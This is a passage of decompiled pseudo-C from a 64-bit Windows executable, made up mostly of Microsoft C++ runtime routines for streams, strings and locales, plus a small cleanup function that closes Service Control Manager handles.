    if ( (v4 & 1) != 0 )
      sub_140006A90((struct std::_Locinfo *)v8);
  }
  return 2;
}


// ----- ?_Getctype@_Locinfo@std@@QEBA?AU_Ctypevec@@XZ @ 0x140008830 -----
struct _Ctypevec *__fastcall std::_Locinfo::_Getctype(std::_Locinfo *this, struct _Ctypevec *__return_ptr retstr)
{
  _BYTE v4[56]; // [rsp+20h] [rbp-38h] BYREF

  *retstr = *(struct _Ctypevec *)sub_14000FCAC(v4);
  return retstr;
}


// ----- ?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z @ 0x140008870 -----
const struct std::locale::facet *__fastcall std::locale::_Getfacet(std::locale *this, unsigned __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-28h]
  __int64 v4; // [rsp+30h] [rbp-18h]

  if ( a2 >= *(_QWORD *)(*((_QWORD *)this + 1) + 24LL) )
    v3 = 0;
  else
    v3 = *(_QWORD *)(*(_QWORD *)(*((_QWORD *)this + 1) + 16LL) + 8 * a2);
  if ( v3 != 0 || *(_BYTE *)(*((_QWORD *)this + 1) + 36LL) == 0 )
    return (const struct std::locale::facet *)v3;
  v4 = sub_14000F9EC();
  if ( a2 >= *(_QWORD *)(v4 + 24) )
    return nullptr;
  else
    return *(const struct std::locale::facet **)(*(_QWORD *)(v4 + 16) + 8 * a2);
}


// ----- ?_Getstate@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAHH@Z @ 0x140008920 -----
__int64 __fastcall std::stringbuf::_Getstate(char a1)
{
  unsigned int v2; // [rsp+0h] [rbp-18h]

  v2 = 0;
  if ( (a1 & 1) == 0 )
    v2 = 4;
  if ( (a1 & 2) == 0 )
    v2 |= 2u;
  if ( (a1 & 8) != 0 )
    v2 |= 8u;
  if ( (a1 & 4) != 0 )
    v2 |= 0x10u;
  return v2;
}


// ----- unknown_libname_18 @ 0x140008990 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_18(__int64 a1)
{
  if ( **(_QWORD **)(a1 + 56) != 0 )
    return **(int **)(a1 + 80);
  else
    return 0;
}


// ----- ?_Gndec@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ @ 0x1400089d0 -----
__int64 __fastcall std::streambuf::_Gndec(__int64 a1)
{
  __int64 result; // rax

  ++**(_DWORD **)(a1 + 80);
  result = **(_QWORD **)(a1 + 56) - 1LL;
  **(_QWORD **)(a1 + 56) = result;
  return result;
}


// ----- ?_Gninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ @ 0x140008a20 -----
__int64 __fastcall std::streambuf::_Gninc(__int64 a1)
{
  __int64 v2; // [rsp+0h] [rbp-18h]

  --**(_DWORD **)(a1 + 80);
  v2 = **(_QWORD **)(a1 + 56);
  **(_QWORD **)(a1 + 56) = v2 + 1;
  return v2;
}


// ----- sub_140008A80 @ 0x140008a80 -----
__int64 __fastcall sub_140008A80(__int64 a1)
{
  __int64 result; // rax

  --**(_DWORD **)(a1 + 80);
  result = **(_QWORD **)(a1 + 56) + 1LL;
  **(_QWORD **)(a1 + 56) = result;
  return result;
}


// ----- unknown_libname_19 @ 0x140008ad0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_19(__int64 a1)
{
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 8));
  return a1 + 8;
}


// ----- sub_140008AF0 @ 0x140008af0 -----
__int64 __fastcall sub_140008AF0(__int64 a1, FILE *a2, int a3)
{
  int *Count; // [rsp+50h] [rbp-28h] BYREF
  char **Pointer; // [rsp+58h] [rbp-20h] BYREF
  char **Base; // [rsp+60h] [rbp-18h] BYREF

  *(_BYTE *)(a1 + 124) = a3 == 1;
  *(_BYTE *)(a1 + 113) = 0;
  std::streambuf::_Init(a1);
  if ( a2 != nullptr )
  {
    Base = nullptr;
    Pointer = nullptr;
    Count = nullptr;
    get_stream_buffer_pointers(a2, &Base, &Pointer, &Count);
    unknown_libname_20(
      a1,
      (_DWORD)Base,
      (_DWORD)Pointer,
      (_DWORD)Count,
      (__int64)Base,
      (__int64)Pointer,
      (__int64)Count);
  }
  *(_QWORD *)(a1 + 128) = a2;
  *(_QWORD *)(a1 + 116) = qword_14009FC48;
  *(_QWORD *)(a1 + 104) = 0;
  return a1;
}


// ----- unknown_libname_20 @ 0x140008c40 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_20(
        _QWORD *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7)
{
  a1[3] = a2;
  a1[4] = a5;
  a1[7] = a3;
  a1[8] = a6;
  a1[10] = a4;
  a1[11] = a7;
  return a1;
}


// ----- ?_Init@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAXXZ @ 0x140008cb0 -----
__int64 __fastcall std::streambuf::_Init(_QWORD *a1)
{
  a1[3] = a1 + 1;
  a1[4] = a1 + 2;
  a1[7] = a1 + 5;
  a1[8] = a1 + 6;
  a1[10] = a1 + 9;
  a1[11] = (char *)a1 + 76;
  std::streambuf::setp(a1, 0, 0);
  return std::streambuf::setg(a1, 0, 0, 0);
}


// ----- sub_140008D50 @ 0x140008d50 -----
__int64 __fastcall sub_140008D50(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  __int64 v4; // rax
  __int64 v6; // [rsp+20h] [rbp-38h]
  __int64 v7; // [rsp+30h] [rbp-28h]
  unsigned __int64 v8; // [rsp+38h] [rbp-20h] BYREF
  unsigned int v12; // [rsp+78h] [rbp+20h]

  v12 = a4 & 0xFFFFFFDF;
  if ( a3 > 0x7FFFFFFF )
    sub_14000F820();
  if ( a3 == 0 || (v12 & 6) == 6 )
  {
    *(_QWORD *)(a1 + 104) = 0;
  }
  else
  {
    v8 = a3;
    v4 = std::_Allocate_at_least_helper<std::allocator<char>>(a1 + 116, &v8);
    v6 = unknown_libname_71(v4);
    sub_14000A830(v6, a2, a3);
    *(_QWORD *)(a1 + 104) = v8 + v6;
    if ( (v12 & 4) == 0 )
      std::streambuf::setg(a1, v6, v6, *(_QWORD *)(a1 + 104));
    if ( (v12 & 2) == 0 )
    {
      v7 = *(_QWORD *)(a1 + 104);
      if ( (v12 & 0x18) != 0 )
        std::streambuf::setp(a1, v6, *(_QWORD *)(a1 + 104), v7);
      else
        std::streambuf::setp(a1, v6, v6, v7);
      if ( (v12 & 4) != 0 )
        std::streambuf::setg(a1, v6, v6, v6);
    }
    v12 |= 1u;
  }
  *(_DWORD *)(a1 + 112) = v12;
  return a1;
}


// ----- ?_Init@?$ctype@D@std@@IEAAXAEBV_Locinfo@2@@Z @ 0x140008ef0 -----
struct _Ctypevec *__fastcall std::ctype<char>::_Init(__int64 a1, std::_Locinfo *a2)
{
  struct _Ctypevec *result; // rax
  struct _Ctypevec v3; // [rsp+20h] [rbp-38h] BYREF

  result = std::_Locinfo::_Getctype(a2, &v3);
  qmemcpy((void *)(a1 + 16), result, 0x20u);
  return result;
}


// ----- ?_Init@ios_base@std@@IEAAXXZ @ 0x140008f30 -----
void __fastcall std::ios_base::_Init(std::ios_base *this)
{
  std::locale *v1; // [rsp+20h] [rbp-18h]
  std::locale *v2; // [rsp+28h] [rbp-10h]

  *((_QWORD *)this + 8) = 0;
  *((_QWORD *)this + 1) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_DWORD *)this + 6) = 513;
  *((_QWORD *)this + 4) = 6;
  *((_QWORD *)this + 5) = 0;
  *((_QWORD *)this + 6) = 0;
  *((_QWORD *)this + 7) = 0;
  sub_14000A5C0(this, 0);
  v1 = (std::locale *)operator new(0x10u);
  if ( v1 != nullptr )
  {
    sub_14000A160(v1, 16);
    v2 = std::locale::locale(v1);
  }
  else
  {
    v2 = nullptr;
  }
  *((_QWORD *)this + 8) = v2;
}


// ----- sub_140009000 @ 0x140009000 -----
__int64 __fastcall sub_140009000(_QWORD *a1, __int64 a2)
{
  if ( (unsigned __int8)sub_14000A210(a2) != 0 )
  {
    a1[13] = 0;
    return (__int64)a1;
  }
  else
  {
    a1[13] = unknown_libname_71(a2);
    return std::streambuf::_Init(a1);
  }
}


// ----- sub_140009060 @ 0x140009060 -----
char __fastcall sub_140009060(__int64 a1, char a2)
{
  __int64 v3; // rax
  __int64 v4; // rax
  unsigned int v5; // eax
  unsigned __int8 v6; // al
  __int64 v7; // rdx
  char v8; // [rsp+20h] [rbp-68h]
  unsigned int i; // [rsp+24h] [rbp-64h]
  __int64 v10; // [rsp+30h] [rbp-58h]
  std::locale *v11; // [rsp+50h] [rbp-38h]
  const struct std::locale::facet *v12; // [rsp+58h] [rbp-30h]
  _BYTE v13[24]; // [rsp+70h] [rbp-18h] BYREF

  if ( (unsigned __int8)sub_14000B810(*(int *)(*(_QWORD *)a1 + 4LL) + a1) != 0 )
  {
    v10 = unknown_libname_46(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
    if ( v10 != 0 )
      sub_14000B540(v10);
    v8 = 0;
    if ( a2 == 0 && (unknown_libname_34(*(int *)(*(_QWORD *)a1 + 4LL) + a1) & 1) != 0 )
    {
      v11 = (std::locale *)std::ios_base::getloc(*(int *)(*(_QWORD *)a1 + 4LL) + a1, v13);
      v12 = sub_1400043A0(v11);
      sub_140006DC0((__int64)v13);
      v3 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
      for ( i = sub_14000DAB0(v3); ; i = sub_14000DB60(v4) )
      {
        v5 = sub_14000B200();
        if ( (unsigned __int8)std::_Narrow_char_traits<char,int>::eq_int_type(v5, i) != 0 )
          break;
        v6 = std::_Narrow_char_traits<char,int>::to_char_type(i);
        LOWORD(v7) = 72;
        if ( (unsigned __int8)std::ctype<char>::is(v12, v7, v6) == 0 )
          goto LABEL_12;
        v4 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
      }
      v8 = 1;
    }
LABEL_12:
    if ( v8 != 0 )
      sub_14000DA70(*(int *)(*(_QWORD *)a1 + 4LL) + a1, 3, 0);
    return sub_14000B810(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
  }
  else
  {
    sub_14000DA70(*(int *)(*(_QWORD *)a1 + 4LL) + a1, 2, 0);
    return 0;
  }
}


// ----- sub_1400092F0 @ 0x1400092f0 -----
char sub_1400092F0()
{
  return 0;
}


// ----- ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ @ 0x140009300 -----
_BOOL8 __fastcall std::_String_val<std::_Simple_types<char>>::_Large_mode_engaged(__int64 a1)
{
  return *(_QWORD *)(a1 + 24) > 0xFu;
}


// ----- ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ @ 0x140009330 -----
_BOOL8 __fastcall std::_String_val<std::_Simple_types<wchar_t>>::_Large_mode_engaged(__int64 a1)
{
  return *(_QWORD *)(a1 + 24) > 7u;
}


// ----- sub_140009360 @ 0x140009360 -----
void __fastcall sub_140009360(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 128) != 0 )
    lock_file(*(FILE **)(a1 + 128));
}


// ----- sub_140009390 @ 0x140009390 -----
void *__fastcall sub_140009390(void *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // [rsp+38h] [rbp-30h]
  _BYTE v5[40]; // [rsp+40h] [rbp-28h] BYREF

  if ( (unsigned __int8)unknown_libname_33(a3) == 0 )
    sub_14000A280(a3, &unk_14008C280);
  v4 = std::error_code::message(a2, v5);
  sub_14000A230(a3, v4);
  sub_140006820((__int64)v5);
  sub_140004D50(a1, a3);
  sub_140006820(a3);
  return a1;
}


// ----- unknown_libname_21 @ 0x140009450 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_21(__int64 *a1)
{
  __int64 *v2; // [rsp+20h] [rbp-18h]

  v2 = a1;
  if ( std::_String_val<std::_Simple_types<char>>::_Large_mode_engaged((__int64)a1) )
    return unknown_libname_71(*a1);
  return (__int64)v2;
}


// ----- unknown_libname_22 @ 0x140009490 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_22(__int64 *a1)
{
  __int64 *v2; // [rsp+20h] [rbp-18h]

  v2 = a1;
  if ( std::_String_val<std::_Simple_types<wchar_t>>::_Large_mode_engaged((__int64)a1) )
    return unknown_libname_71(*a1);
  return (__int64)v2;
}


// ----- sub_1400094D0 @ 0x1400094d0 -----
__int64 __fastcall sub_1400094D0(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // rax

  result = (unsigned __int8)sub_14000B810(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
  if ( (_BYTE)result != 0 )
  {
    result = unknown_libname_34(*(int *)(*(_QWORD *)a1 + 4LL) + a1) & 2;
    if ( (_DWORD)result != 0 )
    {
      v2 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
      result = sub_14000CE70(v2);
      if ( (_DWORD)result == -1 )
        return sub_14000DA70(*(int *)(*(_QWORD *)a1 + 4LL) + a1, 4, 0);
    }
  }
  return result;
}


// ----- unknown_libname_23 @ 0x1400095a0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_23(__int64 a1)
{
  if ( **(_QWORD **)(a1 + 64) != 0 )
    return **(int **)(a1 + 88);
  else
    return 0;
}


// ----- ?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ @ 0x1400095e0 -----
__int64 __fastcall std::streambuf::_Pninc(__int64 a1)
{
  __int64 v2; // [rsp+0h] [rbp-18h]

  --**(_DWORD **)(a1 + 88);
  v2 = **(_QWORD **)(a1 + 64);
  **(_QWORD **)(a1 + 64) = v2 + 1;
  return v2;
}


// ----- sub_140009640 @ 0x140009640 -----
__int64 __fastcall sub_140009640(_QWORD *a1)
{
  *a1 = a1[1];
  return a1[1];
}


// ----- sub_140009660 @ 0x140009660 -----
__int64 __fastcall sub_140009660(__int64 a1)
{
  __int64 result; // rax

  result = unknown_libname_32(a1);
  if ( result == a1 + 112 )
    return std::streambuf::setg(a1, *(_QWORD *)(a1 + 136), *(_QWORD *)(a1 + 136), *(_QWORD *)(a1 + 144));
  return result;
}


// ----- sub_1400096C0 @ 0x1400096c0 -----
__int64 __fastcall sub_1400096C0(__int64 *a1, __int64 a2)
{
  __int64 result; // rax

  result = unknown_libname_71(a2);
  *a1 = result;
  return result;
}


// ----- ?_Set_back@?$basic_filebuf@DU?$char_traits@D@std@@@std@@AEAAXXZ @ 0x1400096f0 -----
__int64 __fastcall std::filebuf::_Set_back(__int64 a1)
{
  if ( unknown_libname_32(a1) != a1 + 112 )
  {
    *(_QWORD *)(a1 + 136) = unknown_libname_32(a1);
    *(_QWORD *)(a1 + 144) = std::streambuf::egptr(a1);
  }
  return std::streambuf::setg(a1, a1 + 112, a1 + 112, a1 + 113);
}


// ----- unknown_libname_24 @ 0x140009770 -----
// Microsoft VisualC v14 64bit runtime
void __fastcall unknown_libname_24(void *a1, const struct __crt_win32_buffer_empty_debug_info *a2)
{
  __crt_win32_buffer_no_resizing::deallocate(a1, a2);
}


// ----- sub_1400097A0 @ 0x1400097a0 -----
unsigned __int64 __fastcall sub_1400097A0(__int64 a1)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+20h] [rbp-18h]

  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  result = (unsigned __int8)sub_1400092F0();
  if ( (_BYTE)result != 0 )
  {
    for ( i = 0; i < 0x10; ++i )
    {
      *(_BYTE *)(i + a1) = 0;
      result = i + 1;
    }
  }
  return result;
}


// ----- sub_140009800 @ 0x140009800 -----
unsigned __int64 __fastcall sub_140009800(__int64 a1)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+20h] [rbp-18h]

  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  result = (unsigned __int8)sub_1400092F0();
  if ( (_BYTE)result != 0 )
  {
    for ( i = 0; i < 8; ++i )
    {
      *(_WORD *)(a1 + 2 * i) = 0;
      result = i + 1;
    }
  }
  return result;
}


// ----- sub_140009860 @ 0x140009860 -----
__int64 __fastcall sub_140009860(_QWORD *a1, _QWORD *a2)
{
  __int64 v3; // rax
  char v4; // [rsp+20h] [rbp-48h] BYREF
  char v5[7]; // [rsp+21h] [rbp-47h] BYREF
  _QWORD *v6; // [rsp+28h] [rbp-40h]
  _QWORD *v7; // [rsp+30h] [rbp-38h]
  void *v8; // [rsp+38h] [rbp-30h]
  const void *v9; // [rsp+40h] [rbp-28h]
  __int64 v10; // [rsp+48h] [rbp-20h]

  v7 = a1;
  v6 = a2;
  if ( sub_1400092F0() != 0 )
  {
    if ( std::_String_val<std::_Simple_types<char>>::_Large_mode_engaged((__int64)v6) )
    {
      unknown_libname_24(a1, (const struct __crt_win32_buffer_empty_debug_info *)a2);
      sub_140002850((__int64)v7, v6);
      sub_1400097A0((__int64)v6);
    }
    else
    {
      _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
      std::_String_val<std::_Simple_types<char>>::_Activate_SSO_buffer((__int64)v7);
      v3 = v6[2] + 1LL;
      v10 = (__int64)v7;
      sub_14000A830(v7, v6, v3);
    }
    v7[3] = v6[3];
    v7[2] = v6[2];
    v6[2] = 0;
    v6[3] = 15;
    v5[0] = 0;
    return unknown_libname_25(v6, v5);
  }
  else
  {
    v8 = (void *)unknown_libname_71((__int64)a1);
    v9 = (const void *)unknown_libname_71((__int64)a2);
    qmemcpy(v8, v9, 0x20u);
    v6[2] = 0;
    v6[3] = 15;
    std::_String_val<std::_Simple_types<char>>::_Activate_SSO_buffer((__int64)v6);
    v4 = 0;
    return unknown_libname_25(v6, &v4);
  }
}


// ----- sub_140009A10 @ 0x140009a10 -----
__int64 __fastcall sub_140009A10(_QWORD *a1, _QWORD *a2)
{
  __int64 v3; // rax
  __int16 v4; // [rsp+20h] [rbp-48h] BYREF
  __int16 v5; // [rsp+22h] [rbp-46h] BYREF
  _QWORD *v6; // [rsp+28h] [rbp-40h]
  _QWORD *v7; // [rsp+30h] [rbp-38h]
  void *v8; // [rsp+38h] [rbp-30h]
  const void *v9; // [rsp+40h] [rbp-28h]
  __int64 v10; // [rsp+48h] [rbp-20h]

  v7 = a1;
  v6 = a2;
  if ( sub_1400092F0() != 0 )
  {
    if ( std::_String_val<std::_Simple_types<wchar_t>>::_Large_mode_engaged((__int64)v6) )
    {
      unknown_libname_24(a1, (const struct __crt_win32_buffer_empty_debug_info *)a2);
      sub_140002850((__int64)v7, v6);
      sub_140009800((__int64)v6);
    }
    else
    {
      _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
      std::_String_val<std::_Simple_types<wchar_t>>::_Activate_SSO_buffer((__int64)v7);
      v3 = v6[2] + 1LL;
      v10 = (__int64)v7;
      sub_14000A8C0(v7, v6, v3);
    }
    v7[3] = v6[3];
    v7[2] = v6[2];
    v6[2] = 0;
    v6[3] = 7;
    v5 = 0;
    return unknown_libname_26(v6, &v5);
  }
  else
  {
    v8 = (void *)unknown_libname_71((__int64)a1);
    v9 = (const void *)unknown_libname_71((__int64)a2);
    qmemcpy(v8, v9, 0x20u);
    v6[2] = 0;
    v6[3] = 7;
    std::_String_val<std::_Simple_types<wchar_t>>::_Activate_SSO_buffer((__int64)v6);
    v4 = 0;
    return unknown_libname_26(v6, &v4);
  }
}


// ----- sub_140009BC0 @ 0x140009bc0 -----
__int64 sub_140009BC0()
{
  _BYTE v1[40]; // [rsp+20h] [rbp-28h] BYREF

  std::bad_array_new_length::bad_array_new_length((std::bad_array_new_length *)v1);
  return sub_140011278(v1, &_TI3_AVbad_array_new_length_std__);
}


// ----- sub_140009BF0 @ 0x140009bf0 -----
__int64 sub_140009BF0()
{
  _BYTE v1[40]; // [rsp+20h] [rbp-28h] BYREF

  sub_140005C20((std::exception *)v1);
  return sub_140011278(v1, &_TI2_AVbad_cast_std__);
}


// ----- sub_140009C20 @ 0x140009c20 -----
void **__fastcall sub_140009C20(void **a1)
{
  if ( *a1 != nullptr )
    j__free_base(*a1);
  *a1 = nullptr;
  return a1;
}


// ----- sub_140009C60 @ 0x140009c60 -----
__int64 __fastcall sub_140009C60(__int64 a1)
{
  __int64 v1; // rax
  __int64 result; // rax
  __int64 v3; // [rsp+20h] [rbp-28h]
  __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]

  if ( (*(_DWORD *)(a1 + 112) & 1) != 0 )
  {
    if ( unknown_libname_40(a1) != 0 )
      v3 = std::streambuf::epptr(a1);
    else
      v3 = std::streambuf::egptr(a1);
    v4 = v3 - unknown_libname_32(a1);
    v1 = unknown_libname_32(a1);
    v5 = sub_14000CE30(v1);
    sub_14000AA30(a1 + 116, v5, v4);
  }
  std::streambuf::setg(a1, 0, 0, 0);
  std::streambuf::setp(a1, 0, 0);
  *(_QWORD *)(a1 + 104) = 0;
  result = *(_DWORD *)(a1 + 112) & 0xFFFFFFFE;
  *(_DWORD *)(a1 + 112) = result;
  return result;
}


// ----- sub_140009D50 @ 0x140009d50 -----
void __fastcall sub_140009D50(__int64 a1)
{
  if ( *(int *)(a1 + 32) <= 0 )
  {
    if ( *(int *)(a1 + 32) < 0 )
      j_j_j__free_base(*(void **)(a1 + 24));
  }
  else
  {
    j__free_base(*(void **)(a1 + 24));
  }
  j__free_base(*(void **)(a1 + 40));
}


// ----- sub_140009DB0 @ 0x140009db0 -----
_QWORD *__fastcall sub_140009DB0(_QWORD *a1)
{
  _QWORD *result; // rax
  __int64 v2; // [rsp+30h] [rbp-28h]
  _QWORD *v3; // [rsp+40h] [rbp-18h]

  v2 = sub_140008610((__int64)a1);
  v3 = a1 + 2;
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  result = a1;
  if ( *a1 != 0 )
  {
    _castguard_slow_path_check_nop();
    sub_14000AA30(v2, *a1, *v3 - *a1);
    *a1 = 0;
    a1[1] = 0;
    *v3 = 0;
    return a1 + 2;
  }
  return result;
}


// ----- sub_140009E80 @ 0x140009e80 -----
_QWORD *__fastcall sub_140009E80(_QWORD *a1)
{
  _QWORD *result; // rax
  __int64 v2; // [rsp+30h] [rbp-28h]
  _QWORD *v3; // [rsp+40h] [rbp-18h]

  v2 = sub_140008610((__int64)a1);
  v3 = a1 + 2;
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  result = a1;
  if ( *a1 != 0 )
  {
    _castguard_slow_path_check_nop();
    sub_14000AA60(v2, *a1, (__int64)(*v3 - *a1) >> 2);
    *a1 = 0;
    a1[1] = 0;
    *v3 = 0;
    return a1 + 2;
  }
  return result;
}


// ----- sub_140009F50 @ 0x140009f50 -----
__int64 __fastcall sub_140009F50(__int64 *a1)
{
  _BYTE v2[8]; // [rsp+20h] [rbp-28h] BYREF
  __int64 *v3; // [rsp+28h] [rbp-20h]
  __int64 v4; // [rsp+30h] [rbp-18h]

  v3 = a1;
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  if ( std::_String_val<std::_Simple_types<char>>::_Large_mode_engaged((__int64)v3) )
  {
    v4 = sub_140008610((__int64)a1);
    sub_140008220(v4, *v3, v3[3]);
    sub_1400097A0((__int64)v3);
  }
  v3[2] = 0;
  v3[3] = 15;
  v2[0] = 0;
  return unknown_libname_25(v3, v2);
}


// ----- sub_14000A000 @ 0x14000a000 -----
__int64 __fastcall sub_14000A000(__int64 *a1)
{
  __int16 v2; // [rsp+20h] [rbp-28h] BYREF
  __int64 *v3; // [rsp+28h] [rbp-20h]
  __int64 v4; // [rsp+30h] [rbp-18h]

  v3 = a1;
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  if ( std::_String_val<std::_Simple_types<wchar_t>>::_Large_mode_engaged((__int64)v3) )
  {
    v4 = sub_140008610((__int64)a1);
    std::wstring::_Deallocate_for_capacity(v4, *v3, v3[3]);
    sub_140009800((__int64)v3);
  }
  v3[2] = 0;
  v3[3] = 7;
  v2 = 0;
  return unknown_libname_26(v3, &v2);
}


// ----- sub_14000A0B0 @ 0x14000a0b0 -----
__int64 __fastcall sub_14000A0B0(__int64 a1)
{
  return unknown_libname_71(*(_QWORD *)(a1 + 8));
}


// ----- sub_14000A0D0 @ 0x14000a0d0 -----
void __fastcall sub_14000A0D0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 128) != 0 )
    unlock_file(*(FILE **)(a1 + 128));
}


// ----- sub_14000A100 @ 0x14000a100 -----
void __noreturn sub_14000A100()
{
  sub_14000F840("string too long");
}


// ----- sub_14000A120 @ 0x14000a120 -----
void __noreturn sub_14000A120()
{
  sub_14000F840("vector too long");
}


// ----- sub_14000A140 @ 0x14000a140 -----
void __noreturn sub_14000A140()
{
  sub_14000F864("invalid string position");
}


// ----- sub_14000A160 @ 0x14000a160 -----
__int64 __fastcall sub_14000A160(void *a1, unsigned __int64 a2)
{
  memset(a1, 0, a2);
  return 0;
}


// ----- ?allocate@?$allocator@D@std@@QEAAPEAD_K@Z @ 0x14000a180 -----
__int64 __fastcall std::allocator<char>::allocate(__int64 a1, __int64 a2)
{
  unsigned __int64 size_of; // rax

  size_of = std::_Get_size_of_n<1>(a2);
  return sub_140001C60(size_of);
}


// ----- sub_14000A1B0 @ 0x14000a1b0 -----
__int64 __fastcall sub_14000A1B0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rax

  v2 = sub_1400031D0(a2, a2);
  return sub_140001C60(v2);
}


// ----- sub_14000A1E0 @ 0x14000a1e0 -----
__int64 __fastcall sub_14000A1E0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rax

  v2 = sub_140003180(a2, a2);
  return sub_140001C60(v2);
}


// ----- sub_14000A210 @ 0x14000a210 -----
__int64 __fastcall sub_14000A210(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 24LL))(a1);
}


// ----- sub_14000A230 @ 0x14000a230 -----
__int64 __fastcall sub_14000A230(__int64 a1, __int64 *a2)
{
  unsigned __int64 v3; // [rsp+20h] [rbp-18h]
  __int64 v4; // [rsp+28h] [rbp-10h]

  v3 = a2[2];
  v4 = unknown_libname_21(a2);
  return sub_140001F50(a1, v4, v3);
}


// ----- sub_14000A280 @ 0x14000a280 -----
__int64 __fastcall sub_14000A280(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 v3; // rax

  v2 = sub_14000BBC0(a2);
  v3 = unknown_libname_71(v2);
  return sub_140001F50(a1, a2, v3);
}


// ----- ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z @ 0x14000a2c0 -----
__int64 __fastcall std::string::append(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 v3; // rax

  v2 = sub_14000BBE0(a2);
  v3 = unknown_libname_71(v2);
  return std::string::append(a1, a2, v3);
}


// ----- unknown_libname_25 @ 0x14000a300 -----
// Microsoft VisualC v14 64bit runtime
_BYTE *__fastcall unknown_libname_25(_BYTE *a1, _BYTE *a2)
{
  *a1 = *a2;
  return a1;
}


// ----- unknown_libname_26 @ 0x14000a320 -----
// Microsoft VisualC v14 64bit runtime
_WORD *__fastcall unknown_libname_26(_WORD *a1, _WORD *a2)
{
  *a1 = *a2;
  return a1;
}


// ----- sub_14000A340 @ 0x14000a340 -----
_QWORD *__fastcall sub_14000A340(__int64 *a1, _QWORD *a2)
{
  __int64 v2; // rax
  const struct __crt_win32_buffer_empty_debug_info *v4; // [rsp+20h] [rbp-18h]
  __int64 v5; // [rsp+28h] [rbp-10h]

  v4 = (const struct __crt_win32_buffer_empty_debug_info *)unknown_libname_71((__int64)a1);
  v2 = unknown_libname_22(a1);
  v5 = unknown_libname_71(v2);
  sub_140004510(a2, v5, v4);
  return a2;
}


// ----- unknown_libname_27 @ 0x14000a3a0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_27(__int64 a1)
{
  if ( *(_QWORD *)a1 != 0 )
    return *(_QWORD *)a1;
  else
    return a1 + 8;
}


// ----- sub_14000A3E0 @ 0x14000a3e0 -----
__int64 __fastcall sub_14000A3E0(__int64 *a1)
{
  return unknown_libname_21(a1);
}


// ----- sub_14000A400 @ 0x14000a400 -----
__int64 __fastcall sub_14000A400(__int64 *a1)
{
  return unknown_libname_22(a1);
}


// ----- sub_14000A420 @ 0x14000a420 -----
__int64 __fastcall sub_14000A420(_WORD *a1, unsigned int a2)
{
  if ( *a1 != 0 )
    return (unsigned int)sub_14000A420(a1 + 1, 16777619 * ((unsigned __int16)*a1 ^ a2));
  else
    return a2;
}


// ----- sub_14000A480 @ 0x14000a480 -----
__int64 __fastcall sub_14000A480(_QWORD *a1)
{
  return a1[2] - *a1;
}


// ----- ?file_name@__crt_win32_buffer_debug_info@@QEBAPEBDXZ @ 0x14000a4b0 -----
// Microsoft VisualC v14 64bit runtime
const char *__fastcall __crt_win32_buffer_debug_info::file_name(__crt_win32_buffer_debug_info *this)
{
  return *((const char **)this + 1);
}


// ----- sub_14000A4C0 @ 0x14000a4c0 -----
__int64 __fastcall sub_14000A4C0(__int64 a1)
{
  __int64 result; // rax

  if ( *(_QWORD *)(a1 + 48) != -1 )
  {
    CloseHandle(*(HANDLE *)(a1 + 48));
    *(_QWORD *)(a1 + 48) = -1;
  }
  if ( *(_QWORD *)(a1 + 40) != 0 )
  {
    CloseServiceHandle(*(SC_HANDLE *)(a1 + 40));
    *(_QWORD *)(a1 + 40) = 0;
  }
  result = a1;
  if ( *(_QWORD *)(a1 + 32) != 0 )
  {
    CloseServiceHandle(*(SC_HANDLE *)(a1 + 32));
    *(_QWORD *)(a1 + 32) = 0;
    return a1;
  }
  return result;
}


